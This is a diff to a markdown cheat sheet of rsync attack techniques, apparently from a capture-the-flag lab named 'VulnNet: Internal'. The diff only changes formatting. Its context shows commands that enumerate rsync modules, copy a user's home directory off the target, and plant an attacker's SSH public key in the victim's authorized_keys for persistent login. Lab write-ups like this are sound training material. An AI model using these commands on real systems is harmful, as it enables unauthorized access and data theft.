@@ -9,7 +9,9 @@ File-synchronization tool that doubles as a transport. When the server runs `rsy
 rsync --list-only rsync://$TARGET/
 rsync --list-only rsync://rsync-connect@$TARGET/
 ```
-Used on: **VulnNet: Internal** — enumerated `files` module.
+Used on: **VulnNet: Internal**
+
+enumerated `files` module.
 
 ### Prepare a password file (required by `--password-file`)
 ```bash
@@ -23,7 +25,9 @@ Used on: **VulnNet: Internal**
 rsync -av --password-file=/tmp/rsync.pass \
   rsync-connect@$TARGET::files ./rsync_files/
 ```
-Used on: **VulnNet: Internal** — mirrored the `files` module, which contained `sys-internal/` home.
+Used on: **VulnNet: Internal**
+
+mirrored the `files` module, which contained `sys-internal/` home.
 
 Flags:
 - `-a` — archive (preserves perms, times, symlinks, recurses)
@@ -36,7 +40,9 @@ Flags:
 rsync --password-file=/tmp/rsync.pass authorized_keys \
   rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
 ```
-Used on: **VulnNet: Internal** — dropped the attacker's pubkey as `authorized_keys` in the victim user's `.ssh/`, enabling SSH login.
+Used on: **VulnNet: Internal**
+
+dropped the attacker's pubkey as `authorized_keys` in the victim user's `.ssh/`, enabling SSH login.
 
 ### Equivalent URL forms
 Both of these work:
